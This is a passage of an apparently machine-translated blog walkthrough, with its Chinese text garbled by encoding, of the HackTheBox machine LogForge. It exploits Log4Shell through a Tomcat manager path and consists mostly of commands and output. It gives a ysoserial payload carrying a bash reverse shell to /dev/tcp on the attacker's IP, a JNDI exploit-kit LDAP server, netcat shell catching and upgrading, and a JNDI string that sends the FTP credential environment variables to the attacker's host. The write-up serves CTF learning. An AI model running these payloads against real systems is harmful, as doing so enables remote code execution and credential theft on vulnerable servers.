true):<br/>rmi://10.10.14.12:1099/u3rmld<br/>ldap://10.10.14.12:389/u3rmld</span></pre><p id="d96b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æ¥ä¸‹æ¥ï¼Œåœ¨å¦ä¸€ä¸ªç»ˆç«¯ä¸­å¯åŠ¨tcpdumpä¾¦å¬ICMPæ•°æ®åŒ…ï¼Œä»¥æ•è·æ¥è‡ªæœºå™¨çš„ping:</p><pre class="lk ll lm ln gt ne nf ng nh aw ni bi"><span id="27c7" class="nj km iq nf b gy nk nl l nm nn">â”Œâ”€â”€(rootğŸ’€kali)-[~]<br/>â””â”€# tcpdump -ni tun0 icmp<br/>tcpdump: verbose output suppressed, use -v[v]... for full protocol decode<br/>listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes</span></pre><p id="8518" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ç°åœ¨ï¼Œæˆ‘ä»¬å¯ä»¥åƒä»¥å‰ä¸€æ ·ä½¿ç”¨curlæ¥è§¦å‘JNDIæ¼æ´åˆ©ç”¨ï¼Œä½†è¿™ä¸€æ¬¡æˆ‘ä»¬å°†å®ƒæŒ‡å‘JNDIæ¼æ´åˆ©ç”¨å·¥å…·åŒ…æ‰˜ç®¡çš„ç›®æ ‡ï¼Œæ‰€ä»¥ä½¿ç”¨æˆ‘ä»¬ä»ä¸Šé¢é€‰æ‹©çš„é‚£ä¸ª:</p><pre class="lk ll lm ln gt ne nf ng nh aw ni bi"><span id="8247" class="nj km iq nf b gy nk nl l nm nn">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/logforge]<br/>â””â”€# curl "http://10.10.11.138/pencer/..;/manager/html/expire?path=/" --data-binary "idle=\${jndi:ldap://10.10.14.12:389/u3rmld}" <br/>-H "Authorization: Basic dG9tY2F0OnRvbWNhdA=="</span></pre><p id="0265" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">åˆ‡æ¢åˆ°tcpdumpæŸ¥çœ‹ping:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mu mv di mw bf mx"><div class="gh gi ns"><img src="../Images/2f68dd12672ce5169ec69e142f648ec5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*5OZ1ccSanEyMJCISGeu8sg.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">å¯¹pingä½¿ç”¨JNDIæ¼æ´çš„å“åº”</figcaption></figure><p id="67e1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å¦‚æœæ‚¨å›å¤´çœ‹çœ‹æˆ‘ä»¬ä½¿ç”¨exploit kitè¿è¡Œçš„LDAPæœåŠ¡å™¨ï¼Œæˆ‘ä»¬ä¼šçœ‹åˆ°è¿æ¥ï¼Œæˆ‘ä»¬çš„å“åº”æ˜¯ä¼ é€’pencer.seræœ‰æ•ˆè´Ÿè½½:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mu mv di mw bf mx"><div class="gh gi nt"><img src="../Images/664ee0adea73acc188f23a254725a82d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*qW_Vr0EZFHGvQXKzgJbGbQ.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">JNDIæ¼æ´åˆ©ç”¨å·¥å…·åŒ…LDAPæœåŠ¡å™¨å“åº”æœ‰æ•ˆè´Ÿè½½</figcaption></figure><p id="4cb8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è¿™è¯å®äº†æˆ‘ä»¬å¯ä»¥åœ¨æœåŠ¡å™¨ä¸Šè¿œç¨‹æ‰§è¡Œä»£ç ã€‚è®©æˆ‘ä»¬ç»™è‡ªå·±å¼„ä¸€ä¸ªåå‘shellï¼Œä½¿ç”¨PentestMonkeyçš„ä¸€ä¸ªç®€å•çš„shellï¼Œå°±åƒæˆ‘ä»¬åœ¨<a class="ae lv" href="https://pencer.io/ctf/ctf-htb-dynstr/#reverse-shell" rel="noopener ugc nofollow" target="_blank"> Dynstr </a>ä¸Šåšçš„ä¸€æ ·:</p><pre class="lk ll lm ln gt ne nf ng nh aw ni bi"><span id="0203" class="nj km iq nf b gy nk nl l nm nn">bash -i &gt;&amp; /dev/tcp/10.10.14.12/1337 0&gt;&amp;1</span></pre><p id="a008" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ä½¿ç”¨YSOSerialå†æ¬¡åˆ›å»ºæˆ‘ä»¬çš„æœ‰æ•ˆè´Ÿè½½:</p><pre class="lk ll lm ln gt ne nf ng nh aw ni bi"><span id="ab2c" class="nj km iq nf b gy nk nl l nm nn">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/logforge]<br/>â””â”€# java -jar ysoserial-modified/target/ysoserial-modified.jar CommonsCollections5 bash 'bash -i &gt;&amp; /dev/tcp/10.10.14.12/1337 0&gt;&amp;1' &gt; shell.ser</span></pre><p id="7611" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">åœæ­¢tcpdumpå¹¶åœ¨ç«¯å£1337ä¸Šå¯åŠ¨netcatä¾¦å¬ã€‚åœæ­¢JNDIåˆ©ç”¨å·¥å…·åŒ…ï¼Œå¹¶å¼€å§‹å†æ¬¡ä¸æˆ‘ä»¬æ–°çš„åå‘å¤–å£³æœ‰æ•ˆè½½è·:</p><pre class="lk ll lm ln gt ne nf ng nh aw ni bi"><span id="dc92" class="nj km iq nf b gy nk nl l nm nn">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/logforge]<br/>â””â”€# java -jar JNDI-Exploit-Kit/target/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -P ysoserial-modified/target/shell.ser -L 10.10.14.12:389</span></pre><p id="22bc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è®°ä¸‹æ–°çš„ç›®æ ‡URL:</p><pre class="lk ll lm ln gt ne nf ng nh aw ni bi"><span id="bd61" class="nj km iq nf b gy nk nl l nm nn">Target environment(Build in JDK 1.5 whose trustURLCodebase is true):<br/>rmi://10.10.14.12:1099/ry0f9s<br/>ldap://10.10.14.12:389/ry0f9s</span></pre><p id="44e8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">åƒæˆ‘ä»¬ä¹‹å‰åšçš„ä¸€æ ·ï¼Œä½¿ç”¨curlæ¥è§¦å‘æ”»å‡»:</p><pre class="lk ll lm ln gt ne nf ng nh aw ni bi"><span id="f69a" class="nj km iq nf b gy nk nl l nm nn">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/logforge]<br/>â””â”€# curl "http://10.10.11.138/pencer/..;/manager/html/expire?path=/" --data-binary "idle=\${jndi:ldap://10.10.14.12:389/ry0f9s}" <br/>-H "Authorization: Basic dG9tY2F0OnRvbWNhdA=="</span></pre><h1 id="e320" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">åå‘å¤–å£³</h1><p id="a3f9" class="pw-post-body-paragraph jn jo iq jp b jq mo js jt ju mp jw jx jy mq ka kb kc mr ke kf kg ms ki kj kk ij bi translated">å¦‚æœä¸€åˆ‡é¡ºåˆ©ï¼Œåˆ‡æ¢åˆ°ncç›‘å¬å™¨æ¥æŸ¥çœ‹æˆ‘ä»¬çš„shellè¿æ¥:</p><pre class="lk ll lm ln gt ne nf ng nh aw ni bi"><span id="ca71" class="nj km iq nf b gy nk nl l nm nn">â”Œâ”€â”€(rootğŸ’€kali)-[~]<br/>â””â”€# nc -nlvp 1337<br/>listening on [any] 1337 ...<br/>connect to [10.10.14.12] from (UNKNOWN) [10.10.11.138] 49842<br/>bash: cannot set terminal process group (776): Inappropriate ioctl for device<br/>bash: no job control in this shell<br/>tomcat@LogForge:/var/lib/tomcat9$</span></pre><p id="b9a1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">åœ¨æˆ‘ä»¬ç»§ç»­ä¹‹å‰ï¼Œè®©æˆ‘ä»¬å¯¹shellè¿›è¡Œé€šå¸¸çš„å‡çº§ï¼Œä»¥ä½¿å®ƒæ›´å®¹æ˜“ä½¿ç”¨:</p><pre class="lk ll lm ln gt ne nf ng nh aw ni bi"><span id="437a" class="nj km iq nf b gy nk nl l nm nn">tomcat@LogForge:/var/lib/tomcat9$ python3 -c 'import pty;pty.spawn("/bin/bash")'<br/>tomcat@LogForge:/var/lib/tomcat9$ ^Z<br/>zsh: suspended  nc -nlvp 1337<br/>â”Œâ”€â”€(rootğŸ’€kali)-[~]<br/>â””â”€# stty raw -echo; fg<br/>[1]  + continued  nc -nlvp 1337<br/>tomcat@LogForge:/var/lib/tomcat9$ stty rows 52 cols 237<br/>tomcat@LogForge:/var/lib/tomcat9$ export TERM=xterm</span></pre><p id="ef50" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å¦‚æœä½ éœ€è¦å‚è€ƒï¼Œæˆ‘çš„åšå®¢ä¸Šæœ‰è¿™äº›<a class="ae lv" href="https://pencer.io/ctf/ctf-all-the-things/#upgrade" rel="noopener ugc nofollow" target="_blank"/>ã€‚</p><h1 id="19a8" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">ç”¨æˆ·æ ‡å¿—</h1><p id="2e66" class="pw-post-body-paragraph jn jo iq jp b jq mo js jt ju mp jw jx jy mq ka kb kc mr ke kf kg ms ki kj kk ij bi translated">è®©æˆ‘ä»¬å…ˆæŠ“ä½ç”¨æˆ·æ ‡å¿—:</p><pre class="lk ll lm ln gt ne nf ng nh aw ni bi"><span id="f140" class="nj km iq nf b gy nk nl l nm nn">tomcat@LogForge:/var/lib/tomcat9$ cat /home/htb/user.txt <br/>&lt;HIDDEN&gt;</span></pre><h1 id="8a5f" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">åˆ—ä¸¾</h1><p id="b8bf" class="pw-post-body-paragraph jn jo iq jp b jq mo js jt ju mp jw jx jy mq ka kb kc mr ke kf kg ms ki kj kk ij bi translated">å›åˆ°è¿™ä¸ªæ¡†çš„å¼€å¤´ï¼Œæˆ‘ä»¬åœ¨nmapæ‰«æä¸­çœ‹åˆ°äº†ç«¯å£21ã€‚ç°åœ¨æˆ‘ä»¬åœ¨ç›’å­ä¸Šï¼Œæˆ‘ä»¬å¯ä»¥çœ‹çœ‹å®ƒ:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mu mv di mw bf mx"><div class="gh gi nu"><img src="../Images/6759036d7dcb2da6a351cad5dc3a63ea.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*o1vOZxfMWk4YYw8wz-w8uQ.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">actçš„netstatè¾“å‡º</figcaption></figure><p id="398a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">Netstatæ˜¾ç¤ºæœ‰ä¸œè¥¿åœ¨ç›‘å¬21å·ç«¯å£ã€‚æˆ‘ä»¬çŸ¥é“è¿™æ˜¯FTPçš„é»˜è®¤ç«¯å£ï¼Œè®©æˆ‘ä»¬çœ‹çœ‹æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹:</p><pre class="lk ll lm ln gt ne nf ng nh aw ni bi"><span id="a0a1" class="nj km iq nf b gy nk nl l nm nn">tomcat@LogForge:/var/lib/tomcat9$ ps -ax | grep ftp<br/> 993 ?  Sl  0:26 java -jar /root/ftpServer-1.0-SNAPSHOT-all.jar</span></pre><h1 id="1f3e" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">Java FTPæœåŠ¡å™¨</h1><p id="b2da" class="pw-post-body-paragraph jn jo iq jp b jq mo js jt ju mp jw jx jy mq ka kb kc mr ke kf kg ms ki kj kk ij bi translated">è¿™å‘Šè¯‰æˆ‘ä»¬çœ‹èµ·æ¥æœ‰ä¸€ä¸ªåŸºäºjavaçš„ftpserveråœ¨æ ¹æ–‡ä»¶å¤¹ä¸­è¿è¡Œã€‚æˆ‘ä»¬å¯ä»¥åœ¨æœ¬åœ°è¿æ¥åˆ°å®ƒ:</p><pre class="lk ll lm ln gt ne nf ng nh aw ni bi"><span id="71af" class="nj km iq nf b gy nk nl l nm nn">tomcat@LogForge:/var/lib/tomcat9$ ftp localhost<br/>Connected to localhost.<br/>220 Welcome to the FTP-Server<br/>Name (localhost:tomcat): <br/>530 Not logged in<br/>Login failed.<br/>Remote system type is FTP.<br/>ftp&gt;</span></pre><p id="0c11" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å¥‡æ€ªçš„æ˜¯ï¼Œæˆ‘åˆšåˆšåœ¨åç§°å­—æ®µæŒ‰äº†enterï¼Œå®ƒæ˜¾ç¤ºç™»å½•å¤±è´¥ï¼Œä½†å®é™…ä¸Šæˆ‘åœ¨:</p><pre class="lk ll lm ln gt ne nf ng nh aw ni bi"><span id="496d" class="nj km iq nf b gy nk nl l nm nn">ftp&gt; ls<br/>200 Command OK<br/>125 Opening ASCII mode data connection for file list.<br/>.profile<br/>.ssh<br/>snap<br/>ftpServer-1.0-SNAPSHOT-all.jar<br/>.bashrc<br/>.selected_editor<br/>run.sh<br/>.lesshst<br/>.bash_history<br/>root.txt<br/>.viminfo<br/>.cache<br/>226 Transfer complete.</span></pre><h1 id="ec4c" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">æ ¹æ ‡å¿—(éé¢„æœŸ)</h1><p id="55b8" class="pw-post-body-paragraph jn jo iq jp b jq mo js jt ju mp jw jx jy mq ka kb kc mr ke kf kg ms ki kj kk ij bi translated">æˆ‘ä»¬çœ‹åˆ°äº†æ ¹æ——ã€‚æˆ‘å¯ä»¥å¾—åˆ°å®ƒå¹¶å®Œæˆè¿™ä¸ªç›’å­:</p><pre class="lk ll lm ln gt ne nf ng nh aw ni bi"><span id="56c3" class="nj km iq nf b gy nk nl l nm nn">ftp&gt; get root.txt<br/>local: root.txt remote: root.txt<br/>200 Command OK<br/>150 Opening ASCII mode data connection for requested file root.txt<br/>WARNING! 1 bare linefeeds received in ASCII mode<br/>File may not have transferred correctly.<br/>226 File transfer successful. Closing data connection.<br/>33 bytes received in 0.00 secs (86.8641 kB/s)<br/>ftp&gt; quit<br/>221 Closing connection<br/><br/>tomcat@LogForge:/tmp$ cat root.txt <br/>&lt;HIDDEN&gt;</span></pre><h1 id="6c01" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">é¢„æœŸè·¯å¾„</h1><p id="130c" class="pw-post-body-paragraph jn jo iq jp b jq mo js jt ju mp jw jx jy mq ka kb kc mr ke kf kg ms ki kj kk ij bi translated">äº‹å®è¯æ˜è¿™æ˜¯æ— æ„çš„ï¼Œæ‰€ä»¥ä¸ºäº†æŒ‰ç…§Ippsecçš„è®¡åˆ’å®Œæˆè¿™ä¸ªç›’å­ï¼Œè®©æˆ‘ä»¬è·å–ftpæœåŠ¡å™¨jaræ–‡ä»¶ï¼Œå¹¶åœ¨Kaliä¸ŠæŸ¥çœ‹å®ƒã€‚</p><p id="4b70" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘ä»¬æ— æ³•ä»/rootä¸­è·å¾—å®ƒï¼Œä½†æ˜¯å¦‚æœæˆ‘ä»¬æŸ¥çœ‹ï¼Œæˆ‘ä»¬ä¼šå‘ç°å®ƒåœ¨æ–‡ä»¶ç³»ç»Ÿçš„å…¶ä»–åœ°æ–¹:</p><pre class="lk ll lm ln gt ne nf ng nh aw ni bi"><span id="10f3" class="nj km iq nf b gy nk nl l nm nn">tomcat@LogForge:/var/lib/tomcat9$ locate ftpServer-1.0-SNAPSHOT-all.jar<br/>/ftpServer-1.0-SNAPSHOT-all.jar<br/>/root/ftpServer-1.0-SNAPSHOT-all.jar</span></pre><p id="8618" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ä¸ºäº†è¿›è¡Œæ¸—é€ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æœºå™¨ä¸Šå¯åŠ¨Python webæœåŠ¡å™¨:</p><pre class="lk ll lm ln gt ne nf ng nh aw ni bi"><span id="f9d5" class="nj km iq nf b gy nk nl l nm nn">tomcat@LogForge:/$ python3 -m http.server 1338<br/>Serving HTTP on 0.0.0.0 port 1338 (http://0.0.0.0:1338/) ...</span></pre><p id="98d2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ç°åœ¨æŠŠå®ƒä»Kalié‚£è¾¹æ‹‰è¿‡æ¥:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mu mv di mw bf mx"><div class="gh gi nv"><img src="../Images/b1f10621309f128386c79e21a250fcbc.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*STt_RAOsZkP3rFlXPO2nqg.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">ä»ç›’å­ä¸­å–å‡ºftpserver</figcaption></figure><h1 id="5f8a" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">JD-GUI</h1><p id="c565" class="pw-post-body-paragraph jn jo iq jp b jq mo js jt ju mp jw jx jy mq ka kb kc mr ke kf kg ms ki kj kk ij bi translated">æˆ‘ä»¬å¯ä»¥åæ±‡ç¼–jaræ–‡ä»¶ï¼Œçœ‹çœ‹FTPæœåŠ¡å™¨åº”ç”¨ç¨‹åºæ˜¯å¦‚ä½•å·¥ä½œçš„ã€‚æœ‰å¾ˆå¤šå·¥å…·å¯ä»¥å®Œæˆè¿™é¡¹ä»»åŠ¡ï¼ŒåŒ…æ‹¬<a class="ae lv" href="https://www.javatpoint.com/java-decompiler" rel="noopener ugc nofollow" target="_blank">è¿™ä¸ª</a>æ–¹ä¾¿çš„åœ¨çº¿å·¥å…·ï¼ŒåŠ ä¸Š<a class="ae lv" href="https://www.javatpoint.com/java-decompiler" rel="noopener ugc nofollow" target="_blank">è¿™ç¯‡</a>æ–‡ç« ä¸­æåˆ°çš„å‡ ä¸ªå·¥å…·ã€‚å¯¹äºKaliï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨JD-GUIï¼Œå› ä¸ºå®ƒåŒ…å«åœ¨æ˜“äºå®‰è£…çš„å­˜å‚¨åº“ä¸­:</p><pre class="lk ll lm ln gt ne nf ng nh aw ni bi"><span id="c684" class="nj km iq nf b gy nk nl l nm nn">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/logforge]<br/>â””â”€# jd-gui<br/>Command 'jd-gui' not found, but can be installed with:<br/>apt install jd-gui<br/>Do you want to install it? (N/y)y<br/>apt install jd-gui<br/>Reading package lists... Done<br/>Building dependency tree... Done<br/>Reading state information... Done<br/>The following NEW packages will be installed:<br/>  jd-gui<br/>0 upgraded, 1 newly installed, 0 to remove and 314 not upgraded.<br/>Need to get 1,287 kB of archives.<br/>After this operation, 1500kB of additional disk space will be used.<br/>Get:1 http://kali.download/kali kali-rolling/main amd64 jd-gui all<br/>Fetched 1,287 kB in 1s (1,445 kB/s)<br/>Selecting previously unselected package jd-gui.<br/>Preparing to unpack .../jd-gui_1.6.6-0kali1_all.deb ...<br/>Unpacking jd-gui (1.6.6-0kali1) ...<br/>Setting up jd-gui (1.6.6-0kali1) ...<br/>Processing triggers for kali-menu (2021.4.2) ...</span></pre><p id="3a58" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ç°åœ¨ï¼Œåœ¨æ‚¨çš„ç»ˆç«¯ä¸­é”®å…¥jd-guiæ¥æ‰“å¼€åº”ç”¨ç¨‹åºã€‚ç„¶åä»æ–‡ä»¶èœå•ä¸­é€‰æ‹©æ‰“å¼€æ–‡ä»¶ï¼Œå¹¶é€‰æ‹©æˆ‘ä»¬å¤åˆ¶çš„ftpServer-1.0-SNAPSHOT-all.jar:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi nw"><img src="../Images/3710bab95a36ef3c47e9e6ace4944a1d.png" data-original-src="https://miro.medium.com/v2/resize:fit:846/format:webp/0*5Gs4gh92_o00gh-D.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">ä½¿ç”¨JD-GUIåç¼–è¯‘åº”ç”¨ç¨‹åº</figcaption></figure><p id="fc43" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ç¯é¡¾å››å‘¨ï¼Œæˆ‘ä»¬çœ‹åˆ°ä¸¤ä»¶æœ‰è¶£çš„äº‹æƒ…ã€‚é¦–å…ˆï¼Œå¾ˆæ˜æ˜¾log4jåœ¨è¿™ä¸ªFTPæœåŠ¡å™¨ä¸­ç”¨äºæ—¥å¿—è®°å½•ï¼Œå› ä¸ºä½ å¯ä»¥åœ¨ç±»ä¸­çœ‹åˆ°è®¸å¤šé…ç½®æ–‡ä»¶å’Œå¯¹å®ƒçš„å¼•ç”¨ã€‚å…¶æ¬¡ï¼Œåœ¨å·¥äººé˜¶çº§ä¸­ï¼Œæˆ‘ä»¬çœ‹åˆ°:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi nx"><img src="../Images/d1f21e1b31673bcf88722ee26678b8d2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1380/format:webp/0*GGcgc8xj4tS8ags8.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">æ£€æŸ¥worker.classæ­ç¤ºç¯å¢ƒå˜é‡</figcaption></figure><p id="9714" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è¿™å‘Šè¯‰æˆ‘ä»¬validUserå’ŒvalidPasswordä¿å­˜åœ¨åä¸ºftp_userå’Œftp_passwordçš„ç¯å¢ƒå˜é‡ä¸­ã€‚<a class="ae lv" href="https://www.tutorialspoint.com/java/lang/system_getenv_string.htm" rel="noopener ugc nofollow" target="_blank">è¿™</a>æ˜¯ä¸€ç¯‡è§£é‡Šç¯å¢ƒå˜é‡åœ¨Javaä¸­å¦‚ä½•å·¥ä½œçš„å¥½æ–‡ç« ã€‚</p><h1 id="a464" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">FTP JNDIæ¼æ´1</h1><p id="b1db" class="pw-post-body-paragraph jn jo iq jp b jq mo js jt ju mp jw jx jy mq ka kb kc mr ke kf kg ms ki kj kk ij bi translated">æˆ‘ä»¬å¯ä»¥åƒä»¥å‰ä¸€æ ·ä½¿ç”¨JNDIæ¼æ´å·¥å…·åŒ…æ¥åˆ©ç”¨è¿™ä¸€ç‚¹æ¥å…¬å¼€å˜é‡çš„å€¼ã€‚æ£€æŸ¥å®ƒæ˜¯å¦ä»åœ¨è¿è¡Œï¼Œå¦‚æœæ²¡æœ‰ï¼Œè¯·å†æ¬¡å¯åŠ¨å®ƒ:</p><pre class="lk ll lm ln gt ne nf ng nh aw ni bi"><span id="9820" class="nj km iq nf b gy nk nl l nm nn">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/logforge]<br/>â””â”€# java -jar JNDI-Exploit-Kit/target/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -P ysoserial-modified/target/shell.ser -L 10.10.14.12:389</span></pre><p id="ba23" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å¦‚æœæ‚¨ä¸ç†Ÿæ‚‰tsharkï¼Œå®ƒæ˜¯Wiresharkçš„å‘½ä»¤è¡Œç‰ˆæœ¬ã€‚è¯·çœ‹å®˜æ–¹æ–‡æ¡£<a class="ae lv" href="https://www.wireshark.org/docs/wsug_html_chunked/AppToolstshark.html" rel="noopener ugc nofollow" target="_blank">è¿™é‡Œ</a>å’Œ<a class="ae lv" href="https://hackertarget.com/tshark-tutorial-and-filter-examples/" rel="noopener ugc nofollow" target="_blank">è¿™ä¸ª</a>ç»™äº†æˆ‘ä»¬å‡ ä¸ªä¾‹å­æ¥å¸®åŠ©ç†è§£å¦‚ä½•ä½¿ç”¨å®ƒã€‚</p><p id="d9ea" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å¯åŠ¨tsharkæ¥æ•è·ç½‘ç»œä¸Šçš„æµé‡ï¼Œä»¥å¤‡æˆ‘ä»¬çš„æµæ°“LDAPæœåŠ¡å™¨å“åº”å®ƒå°†ä»æœºå™¨ä¸­æ¥æ”¶çš„JNDIè¯·æ±‚æ—¶ä½¿ç”¨:</p><pre class="lk ll lm ln gt ne nf ng nh aw ni bi"><span id="7230" class="nj km iq nf b gy nk nl l nm nn">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/logforge]<br/>â””â”€# tshark -i tun0 -w capture-output.pcap             <br/>Running as user "root" and group "root". This could be dangerous.<br/>Capturing on 'tun0'</span></pre><p id="2d5b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ç°åœ¨åˆ‡æ¢å›ç›’å­ï¼Œå¯åŠ¨ftpæœåŠ¡å™¨ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨æˆ‘ä»¬ä¹‹å‰ç”¨æ¥è·å–ç”¨æˆ·åå’Œå¯†ç çš„JNDIå­—ç¬¦ä¸²çš„å˜ä½“:</p><pre class="lk ll lm ln gt ne nf ng nh aw ni bi"><span id="89bc" class="nj km iq nf b gy nk nl l nm nn">${jndi:ldap://10.10.14.12:389/PENCER--USER:${env:ftp_user}:PASSWORD:${env:ftp_password}}</span></pre><p id="a5bf" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å½“FTPåœ¨æœºå™¨ä¸Šå¯åŠ¨æ—¶ï¼Œåªéœ€å°†å®ƒç²˜è´´åˆ°åç§°å­—æ®µä¸­:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mu mv di mw bf mx"><div class="gh gi ny"><img src="../Images/a2a307c1f5bf613f0c242994bb036f01.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*lYm0iAVtxF7zPLwMvsVWFQ.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">åˆ©ç”¨JNDIæ¼æ´æš´éœ²ç¯å¢ƒå˜é‡</figcaption></figure><p id="c796" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">é‚£ä¸ªJNDIå­—ç¬¦ä¸²å°†åƒä»¥å‰ä¸€æ ·å›è°ƒæˆ‘ä»¬åœ¨ç«¯å£389ä¸Šçš„Kali LDAPæœåŠ¡å™¨ï¼Œè¿™æ¬¡å®ƒä¸ºftp_userå’Œftp_passwordä¼ é€’ç¯å¢ƒå˜é‡ã€‚å½“å®ƒä»¬è¢«ä¼ é€’ç»™æˆ‘ä»¬æ—¶ï¼Œå®ƒä»¬å°†è¢«è½¬æ¢æˆè¿™äº›å˜é‡çš„å®é™…å€¼ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥çœ‹åˆ°å®ƒä»¬æ˜¯ä»€ä¹ˆäº†ã€‚</p><p id="e81a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">åˆ‡æ¢å›tsharkå’Œctrl-zä»¥åœæ­¢æ•è·ï¼Œç„¶åæˆ‘ä»¬å¯ä»¥è¯»å–pcapæ–‡ä»¶å¹¶è¿‡æ»¤tcp.port == 389ä»¥æŸ¥çœ‹LDAPæµé‡:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mu mv di mw bf mx"><div class="gh gi nz"><img src="../Images/dd2d9dde56f1c9cec7d78b223a2266a3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*muHcJAo3snRptRySy0AUHg.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk 